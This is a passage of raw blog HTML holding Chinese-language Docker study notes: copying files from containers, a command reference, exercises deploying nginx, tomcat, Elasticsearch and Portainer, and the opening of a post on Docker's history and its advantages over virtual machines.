class="bash">docker attach <span class="comment">#进入容器正在执行的终端，不会启动新的进程！</span></span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>从容器拷贝文件到主机上</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">docker cp 容器id:容器内路径 宿主机路径</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">运行容器，并进入容器内部</span></span><br><span class="line">[root@iZ2oaf2ocgsgqtZ ~]# docker run -it centos /bin/bash</span><br><span class="line">[root@0c1ac9169f8d /]# ls     </span><br><span class="line">bin  dev  etc  home  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var</span><br><span class="line">[root@0c1ac9169f8d /]# cd /home</span><br><span class="line"><span class="meta">#</span><span class="bash">创建一个新的文件</span></span><br><span class="line">[root@0c1ac9169f8d home]# touch test.java</span><br><span class="line">[root@0c1ac9169f8d home]# ls</span><br><span class="line">test.java</span><br><span class="line">[root@0c1ac9169f8d home]# [root@iZ2oaf2ocgsgqtZ ~]# ls</span><br><span class="line">[root@iZ2oaf2ocgsgqtZ ~]# docker ps</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES</span><br><span class="line">0c1ac9169f8d        centos              &quot;/bin/bash&quot;         57 seconds ago      Up 57 seconds                           intelligent_jepsen</span><br><span class="line"><span class="meta">#</span><span class="bash">将该文件拷贝到/home</span></span><br><span class="line">[root@iZ2oaf2ocgsgqtZ ~]# docker cp 0c1ac9169f8d:/home/test.java /home</span><br><span class="line">[root@iZ2oaf2ocgsgqtZ ~]# ls</span><br><span class="line">[root@iZ2oaf2ocgsgqtZ ~]# cd ../</span><br><span class="line">[root@iZ2oaf2ocgsgqtZ /]# ls</span><br><span class="line">bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var</span><br><span class="line">[root@iZ2oaf2ocgsgqtZ /]# cd home/</span><br><span class="line">[root@iZ2oaf2ocgsgqtZ home]# ls</span><br><span class="line">test  test.java</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">拷贝是一个手动过程，未来我们使用 -v卷的技术，可以实现</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a><strong>小结</strong></h3><p><img src="/2020/08/13/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%BA%8C/1597402345197.png" class="lazyload" data-srcset="/2020/08/13/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%BA%8C/1597402345197.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1597402345197"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">attach      Attach local standard input, output, and error streams to a running    container  #当前shell下attach 连接指定运行镜像</span><br><span class="line"> build       Build an image from a Dockerfile  #通过 Dockerfile定制镜像</span><br><span class="line"> commit      Create a new image from a container&#x27;s changes #提交当前容器作为一个新的镜像</span><br><span class="line"> cp          Copy files/folders between a container and the local filesystem #从容器中拷贝指定文件或者目录到宿主机中</span><br><span class="line"> create      Create a new container  #创建一个新的容器</span><br><span class="line"> diff        Inspect changes to files or directories on a container&#x27;s filesystem  #查看docker 容器变化</span><br><span class="line"> events      Get real time events from the server  #从docker服务获取容器的实时事件</span><br><span class="line"> exec        Run a command in a running container  #在已存在的容器上运行命令</span><br><span class="line"> export      Export a container&#x27;s filesystem as a tar archive  #导出容器的内容作为一个tar归档文件</span><br><span class="line"> history     Show the history of an image  #展示一个镜像的形成历史</span><br><span class="line"> images      List images  #列出系统当前镜像</span><br><span class="line"> import      Import the contents from a tarball to create a filesystem image  #从tar包中的内容创建一个新的文件系统映像</span><br><span class="line"> info        Display system-wide information  #显示系统相关信息</span><br><span class="line"> inspect     Return low-level information on Docker objects  #查看内容详细信息</span><br><span class="line"> kill        Kill one or more running containers  #kill指定容器</span><br><span class="line"> load        Load an image from a tar archive or STDIN  #从一个tar包中加载一个镜像</span><br><span class="line"> login       Log in to a Docker registry  #注册或者登入一个docker 源服务器</span><br><span class="line"> logout      Log out from a Docker registry  #从当前Docker registry退出</span><br><span class="line"> logs        Fetch the logs of a container  #输出当前容器日志信息</span><br><span class="line"> pause       Pause all processes within one or more containers  #暂停容器</span><br><span class="line"> port        List port mappings or a specific mapping for the container #查看映射端口对应的容器内部源端口</span><br><span class="line"> ps          List containers  #列出容器列表</span><br><span class="line"> pull        Pull an image or a repository from a registry  #从docker镜像源服务器拉去指定镜像</span><br><span class="line"> push        Push an image or a repository to a registry  #推送指定镜像或者库镜像到docker源服务器</span><br><span class="line"> rename      Rename a container  #给一个容器改名</span><br><span class="line"> restart     Restart one or more containers  #重启运行的容器</span><br><span class="line"> rm          Remove one or more containers  #删除容器</span><br><span class="line"> rmi         Remove one or more images  #删除镜像 </span><br><span class="line"> run         Run a command in a new container  #创建一个新的容器运行命令</span><br><span class="line"> save        Save one or more images to a tar archive (streamed to STDOUT by default)  #保存镜像为一个tar包</span><br><span class="line"> search      Search the Docker Hub for images  #在docker hub中搜索镜像</span><br><span class="line"> start       Start one or more stopped containers  #启动容器</span><br><span class="line"> stats       Display a live stream of container(s) resource usage statistics  #显示容器资源使用信息的实时流</span><br><span class="line"> stop        Stop one or more running containers  #停止容器</span><br><span class="line"> tag         Create a tag TARGET_IMAGE that refers to SOURCE_IMAGE  #给源中的镜像打标签</span><br><span class="line"> top         Display the running processes of a container  #查看容器中运行的进程信息</span><br><span class="line"> unpause     Unpause all processes within one or more containers  #取消暂停容器</span><br><span class="line"> update      Update configuration of one or more containers  #更新容器的配置</span><br><span class="line"> version     Show the Docker version information  #查看docker版本</span><br><span class="line"> wait        Block until one or more containers stop, then print their exit codes  #截取容器停止时的退出状态值</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="作业练习"><a href="#作业练习" class="headerlink" title="作业练习"></a>作业练习</h3><hr><blockquote><p>Docker 安装 Nginx</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">下载镜像 pull</span></span><br><span class="line">[root@iZ2oaf2ocgsgqtZ home]# docker pull nginx</span><br><span class="line">Using default tag: latest</span><br><span class="line">latest: Pulling from library/nginx</span><br><span class="line">bf5952930446: Already exists </span><br><span class="line">cb9a6de05e5a: Pull complete </span><br><span class="line">9513ea0afb93: Pull complete </span><br><span class="line">b49ea07d2e93: Pull complete </span><br><span class="line">a5e4a503d449: Pull complete </span><br><span class="line">Digest: sha256:b0ad43f7ee5edbc0effbc14645ae7055e21bc1973aee5150745632a24a752661</span><br><span class="line">Status: Downloaded newer image for nginx:latest</span><br><span class="line">docker.io/library/nginx:latest</span><br><span class="line">[root@iZ2oaf2ocgsgqtZ home]# docker images</span><br><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">nginx               latest              4bb46517cac3        11 hours ago        133MB</span><br><span class="line">centos              latest              0d120b6ccaa8        3 days ago          215MB</span><br><span class="line">mysql               latest              0d64f46acfd1        9 days ago          544MB</span><br><span class="line">nginx               &lt;none&gt;              8cf1bfb43ff5        3 weeks ago         132MB</span><br><span class="line">mattrayner/lamp     latest              05750cfa54d5        3 weeks ago         915MB</span><br><span class="line">hello-world         latest              bf756fb1ae65        7 months ago        13.3kB</span><br><span class="line"><span class="meta">#</span><span class="bash">运行测试 run -d后台运行 --name给容器命名 -p指定端口 宿主机端口:容器内部端口</span></span><br><span class="line">[root@iZ2oaf2ocgsgqtZ home]# docker run -d --name nginx01 -p 8080:80 nginx</span><br><span class="line">29d6b80b8e8712a2c759738c426360d11077e82b62b40db65f89294e91abb32b</span><br><span class="line">[root@iZ2oaf2ocgsgqtZ home]# docker ps</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                  NAMES</span><br><span class="line">29d6b80b8e87        nginx               &quot;/docker-entrypoint.…&quot;   3 seconds ago       Up 2 seconds        0.0.0.0:8080-&gt;80/tcp   nginx01</span><br><span class="line">0c1ac9169f8d        centos              &quot;/bin/bash&quot;              34 minutes ago      Up 34 minutes                              intelligent_jepsen</span><br><span class="line"><span class="meta">#</span><span class="bash">访问测试</span></span><br><span class="line">[root@iZ2oaf2ocgsgqtZ home]# curl localhost:8080</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Welcome to nginx!&lt;/title&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">    body &#123;</span><br><span class="line">        width: 35em;</span><br><span class="line">        margin: 0 auto;</span><br><span class="line">        font-family: Tahoma, Verdana, Arial, sans-serif;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Welcome to nginx!&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;If you see this page, the nginx web server is successfully installed and</span><br><span class="line">working. Further configuration is required.&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;For online documentation and support please refer to</span><br><span class="line">&lt;a href=&quot;http://nginx.org/&quot;&gt;nginx.org&lt;/a&gt;.&lt;br/&gt;</span><br><span class="line">Commercial support is available at</span><br><span class="line">&lt;a href=&quot;http://nginx.com/&quot;&gt;nginx.com&lt;/a&gt;.&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;&lt;em&gt;Thank you for using nginx.&lt;/em&gt;&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">提示:阿里云的服务器的docker内的服务端口原理</span><br></pre></td></tr></table></figure><p><img src="/2020/08/13/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%BA%8C/1597404491686.png" class="lazyload" data-srcset="/2020/08/13/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%BA%8C/1597404491686.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1597404491686"></p><blockquote><p>Docker 安装 tomcat</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">官方的使用</span></span><br><span class="line">docker run -it --rm tomcat:9.0</span><br><span class="line"><span class="meta">#</span><span class="bash">我们之前的启动是后台启动，停止了容器之后，容器还是可以查到 docker run -it --rm 一般用来测试，用完就删除</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">下载再启动</span></span><br><span class="line">docker pull tomcat</span><br><span class="line"><span class="meta">#</span><span class="bash">启动运行</span></span><br><span class="line">docker run -d -p 3355:8080 --name tomcat01 tomcat</span><br><span class="line"><span class="meta">#</span><span class="bash">测试访问没问题</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">进入容器</span></span><br><span class="line">[root@iZ2oaf2ocgsgqtZ home]# docker exec -it tomcat01 /bin/bash</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">发现问题:1、linux命令少了，2没有webapps里面没东西。这是阿里云镜像的问题，默认最小镜像，所有不必要的一律删除，保证最小的运行环境</span></span><br></pre></td></tr></table></figure><blockquote><p>Docker 部署es +kibana</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">es 暴露的端口很多</span></span><br><span class="line"><span class="meta">#</span><span class="bash">es 十分的耗内存</span></span><br><span class="line"><span class="meta">#</span><span class="bash">es的数据一般需要放置到安全目录！挂载</span></span><br><span class="line"><span class="meta">#</span><span class="bash">--net somenetwork ? docker 网络配置</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">启动 elasticsearch</span></span><br><span class="line">docker run -d --name elasticsearch01 -p 9200:9200 -p 9300:9300 -e &quot;discovery.type=single-node&quot; elasticsearch:7.6.2</span><br><span class="line"><span class="meta">#</span><span class="bash">启动了之后 linux卡顿 docker stats查看cpu占用</span></span><br><span class="line"><span class="meta">#</span><span class="bash">es 是十分占内存的</span></span><br><span class="line"><span class="meta">#</span><span class="bash">查看docker</span> </span><br><span class="line">CONTAINER ID        NAME                 CPU %               MEM USAGE / LIMIT    MEM %               NET I/O             BLOCK I/O           PIDS</span><br><span class="line">2dcd19599a83        elasticsearch01      0.17%               1.242GiB / 3.69GiB   33.65%              1.01kB / 0B         0B / 824kB          42</span><br><span class="line">3d10d3fa72fd        tomcat01             0.12%               76.38MiB / 3.69GiB   2.02%               1.5kB / 276B        0B / 0B             36</span><br><span class="line">0c1ac9169f8d        intelligent_jepsen   0.00%               1.48MiB / 3.69GiB    0.04%               1.66kB / 0B         0B / 0B             1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">增加内存限制，修改配置文件-e 环境配置修改 ES_JAVA_OPTS=<span class="string">&quot;-Xms64m -Xmx512m&quot;</span></span></span><br><span class="line">[root@iZ2oaf2ocgsgqtZ home]# docker run -d --name elasticsearch02 -p 9200:9200 -p 9300:9300 -e &quot;discovery.type=single-node&quot; -e ES_JAVA_OPTS=&quot;-Xms64m -Xmx512m&quot; elasticsearch:7.6.2 </span><br><span class="line">[root@iZ2oaf2ocgsgqtZ home]# curl localhost:9200</span><br><span class="line">&#123;</span><br><span class="line">  &quot;name&quot; : &quot;24b3b8117701&quot;,</span><br><span class="line">  &quot;cluster_name&quot; : &quot;docker-cluster&quot;,</span><br><span class="line">  &quot;cluster_uuid&quot; : &quot;dwfVUp1qQn2PcvY6AoysRw&quot;,</span><br><span class="line">  &quot;version&quot; : &#123;</span><br><span class="line">    &quot;number&quot; : &quot;7.6.2&quot;,</span><br><span class="line">    &quot;build_flavor&quot; : &quot;default&quot;,</span><br><span class="line">    &quot;build_type&quot; : &quot;docker&quot;,</span><br><span class="line">    &quot;build_hash&quot; : &quot;ef48eb35cf30adf4db14086e8aabd07ef6fb113f&quot;,</span><br><span class="line">    &quot;build_date&quot; : &quot;2020-03-26T06:34:37.794943Z&quot;,</span><br><span class="line">    &quot;build_snapshot&quot; : false,</span><br><span class="line">    &quot;lucene_version&quot; : &quot;8.4.0&quot;,</span><br><span class="line">    &quot;minimum_wire_compatibility_version&quot; : &quot;6.8.0&quot;,</span><br><span class="line">    &quot;minimum_index_compatibility_version&quot; : &quot;6.0.0-beta1&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;tagline&quot; : &quot;You Know, for Search&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>遗留问题</strong></p><p>docker的两个容器通信问题</p><p><img src="/2020/08/13/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%BA%8C/1597412560002.png" class="lazyload" data-srcset="/2020/08/13/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%BA%8C/1597412560002.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1597412560002"></p><h3 id="可视化"><a href="#可视化" class="headerlink" title="可视化"></a>可视化</h3><hr><ul><li><p>portainer(先用这个)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 8080:9000 \</span><br><span class="line">--restart=always -v /var/run/docker.sock:/var/run/docker.sock --privileged=true portainer/portainer </span><br></pre></td></tr></table></figure></li><li><p>Rancher(CI/CD使用)</p></li></ul><p>什么 是 portainer？</p><p>Docker图形化管理工具，提供后台供我们操作</p><p><img src="/2020/08/13/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%BA%8C/1606828717631.png" class="lazyload" data-srcset="/2020/08/13/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%BA%8C/1606828717631.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1606828717631"></p><p><img src="/2020/08/13/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%BA%8C/1606828744354.png" class="lazyload" data-srcset="/2020/08/13/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%BA%8C/1606828744354.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1606828744354"></p>]]></content>
      
      
      <categories>
          
          <category> linux运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker从入门到精通(一)</title>
      <link href="2020/08/11/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%B8%80/"/>
      <url>2020/08/11/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%B8%80/</url>
      
        <content type="html"><![CDATA[<p>最近在出题需要一些比较麻烦的环境配置就学了一下docker，我是跟着b站的狂神师傅学的，感觉讲的很不错，这是我写下的一些笔记。</p><span id="more"></span><h2 id="Docker概述"><a href="#Docker概述" class="headerlink" title="Docker概述"></a>Docker概述</h2><hr><h3 id="Docker为什么会出现"><a href="#Docker为什么会出现" class="headerlink" title="Docker为什么会出现"></a>Docker为什么会出现</h3><hr><p>一款产品：开发–上线 两套环境！ 应用环境，应用配置！</p><p>开发—运维。解决的问题：我在我的电脑上能运行！版本更新，导致服务不可用！</p><p>环境配置十分麻烦，每个机器都要部署环境（集群redis、es、Hadoop…..）!费时费力</p><blockquote><p>工程问题：发布项目（jar+(redis Mysql jdk es))，项目能不能带上环境安装打包</p></blockquote><p>java可以跨平台，但是应用环境配置麻烦，而且不能跨平台</p><p>想要windows上编写的项目，快速发布到linux</p><p>传统：开发jar，运维来做！</p><p>现在：开发打包部署上线，一套流程做完</p><blockquote><p>java –apk –发布（应用商店）–张三使用apk–安装即可使用</p><p>java–jar（环境）–打包项目打上环境（镜像）–docker仓库—下载发布我们的镜像—直接运行</p></blockquote><p>docker给以上问题提出了解决方案</p><p><img src="/2020/08/11/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%B8%80/1597113692247.png" class="lazyload" data-srcset="/2020/08/11/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%B8%80/1597113692247.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1597113692247"></p><p>docker的思想来源于集装箱！</p><p>jre–多个应用(可能会产生端口冲突)–原来都是交叉的！</p><blockquote><p>隔离：docker的核心思想！打包装箱！每个箱子相互隔离。</p></blockquote><p>docker通过隔离机制，可以将服务器利用到极致!</p><blockquote><p>本质：所有的技术产生都是因为出现了一些问题，需要手段去解决！</p></blockquote><h3 id="docker的历史"><a href="#docker的历史" class="headerlink" title="docker的历史"></a>docker的历史</h3><hr><p>2010年，几个搞IT的年轻人，在美国成立了一家公司 <code>dotCloud</code></p><p>做一些 pass的云计算服务！lxc有关的容器技术！</p><p>他们将自己的技术（容器化技术）命名为docker！</p><p>docker刚刚诞生的时候，并没有引起行业的注意!dotCloud,企业活不下去！</p><p>于是，2013，<code>开源</code> 开放源代码！</p><p>docker越来越多的人返现了docker的优点！火了，Docker每个月都会有新的版本!</p><p>2014年4月9，docker1.0发布！</p><p>docker为什么这么火？十分的轻巧！</p><p>在容器技术出现前，我们一直采用的是虚拟机技术！</p><p>虚拟机技术：在windows中装一个VMware，通过然间我们可以虚拟出一台或者多台的电脑</p><p>工作原理：</p><p><img src="/2020/08/11/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%B8%80/1597114904086-1597115363670.png" class="lazyload" data-srcset="/2020/08/11/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%B8%80/1597114904086-1597115363670.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1597114904086"></p><p>缺点：十分笨重，基本都是10几个GB以上</p><p>虚拟机和docker都属于虚拟化技术！</p><p>到现在，docker成为所有开发人员必备技能 !</p><blockquote><p>聊docker</p></blockquote><p>Docker是基于Go语言开发的！开源项目！</p><p>官网：<a href="https://www.docker.com/">https://www.docker.com/</a></p><p>文档地址: <a href="https://docs.docker.rom/">https://docs.docker.rom/</a> Docker的文档是超级详细的！</p><p>仓库地址：<a href="https://hub.docker.com/">https://hub.docker.com/</a> </p><h3 id="Docker能干嘛"><a href="#Docker能干嘛" class="headerlink" title="Docker能干嘛"></a>Docker能干嘛</h3><blockquote><p>之前的虚拟机技术</p></blockquote><p><img src="/2020/08/11/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%B8%80/1597117433926.png" class="lazyload" data-srcset="/2020/08/11/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%B8%80/1597117433926.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1597117433926"></p><p>虚拟机技术缺点：</p><p>1、资源占用十分多</p><p>2、冗余步骤多</p><p>3、启动慢！</p><blockquote><p>容器化技术</p></blockquote><p><img src="/2020/08/11/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%B8%80/1597204040087.png" class="lazyload" data-srcset="/2020/08/11/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%B8%80/1597204040087.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" 